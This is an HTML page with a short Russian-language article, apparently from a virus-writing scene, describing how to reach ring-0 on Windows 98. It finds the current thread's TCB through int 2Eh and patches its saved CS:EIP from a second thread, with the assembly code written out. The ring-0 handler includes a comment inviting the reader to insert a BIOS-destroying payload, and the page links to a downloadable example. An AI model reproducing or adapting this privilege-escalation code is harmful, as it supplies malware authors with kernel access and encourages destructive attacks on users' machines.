<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<base target="_self">
</head>

<body topmargin="0" leftmargin="0" bgcolor="#E7BE7B" link="#CC0000" vlink="#993300" alink="#FF9900">

<Table border="0" cellPadding="0" cellSpacing="0" width="100%">
        <Tr>
                <Td valign="top" height="33">
                        <Img src="../images/index_08.gif" width="6" height="33"></Td>
                <Td width="100%" background="../images/index_09.gif" valign="top" height="33">
            <img border="0" src="../images/kolesiko.gif" align="absmiddle" width="21" height="33"><font face="Arial" size="2"><b>
                         win98: в ring-0 через TCB
            </b> - 27:10 - <i>by z0mbie</i></font>
            </font></Td>
                <Td valign="top" height="33">
                        <Img src="../images/index_10.gif" width="10" height="33"></Td>
     </Tr>
     <Tr>
                <Td background="../images/index_17.gif">
            &nbsp;</Td>
                <Td width="100%" bgcolor="#E7BE7B">
            <font face="Courier" size="3">
<pre>
     Вашему  вниманию  представляется  очередной  способ  перехода в ring0,
 правда только под win98. Но он может быть легко переделан в win9X.

     Идея  заключается  в  следующем.  На  каждую нить (thread) есть хитрая
 структура,  называемая  TCB (Thread Control Block). Эта структура содержит
 много   всякой   интересной  информации,  например  набор  регистров,  и в
 частности, CS:EIP. А под win9X, TCB, само собой, можно пропатчить.

     Как  найти TCB? Четвердым двордом TCB имеет удобную сигнатуру: 'THCB'.
 Но  искать всякий отстой в памяти уже, честно говоря, надоело, поэтому под
 win98 можно сделать так:

                        mov     eax, 4Fh    ; 4Fh/93h: i2E_xxGetCurrentThread
                        int     2Eh
                        mov     eax, [eax]  ; EAX <-- current TCB
                        mov     save_tcbptr, eax

     Далее  скажем,  что пропатчить CS:EIP у текущей нити из нее же -- дело
 непростое, так что создадим для этого новую нить.

                        push    offset tid      ; *ThreadId
                        push    0               ; flags
                        push    12345678h       ; parameter
                        push    offset newthread; address
                        push    0               ; stack size. 0==same
                        push    0
                        callW   CreateThread

     Далее, приостановим текущую нить, чтобы выполнилась нить созданная:

                        push    1               ; while threads switching
                        callW   Sleep

     И вот, мы уже побывали в нуле. Что же происходило в новой нити?

newthread:              pusha

                        mov     eax, save_tcbptr                ; main TCB
                        mov     eax, [eax].TCB_ClientPtr        ; registers

                        lea     ecx, ring0
                        xchg    ecx, [eax].Client_EIP           ; EIP
                        mov     save_eip, ecx

                        mov     ecx, 28h ; std. win9x ring0 selector
                        xchg    cx, [eax].Client_CS             ; CS
                        mov     save_cs, ecx

                        popa
                        retn

     Как  видим,  простая  замена  CS:EIP  на  свои  собственные. А вот так
 выглядит процедура, на которую попадает управление в нуле:

ring0:                  pusha
                        push    ds es

                        mov     eax, ss
                        mov     ds, eax
                        mov     es, eax

                        ; сюда вставьте факап биоса

                        pop     es ds
                        popa

                        push    cs:save_cs
                        push    cs:save_eip
                        retf

     Ну, собственно, это все. А вы чего ждали?
     <a href="../files/ring0tcb.zip">Пример</a>
</pre>
</font>
</Td>
                <Td background="../images/index_19.gif">
            &nbsp;</Td>
        </Tr>
        <Tr>
                <Td>
                        <Img src="../images/index_44.gif" width="6" height="9"></Td>
                <Td background="../images/index_45.gif" height="9">
            <img border="0" src="../images/spacer.gif" width="9" height="9"></Td>
                <Td>
                        <Img src="../images/index_46.gif" width="10" height="9"></Td>
        </Tr>
</Table>
<br>

</Table>
&nbsp;

</body>

</html>
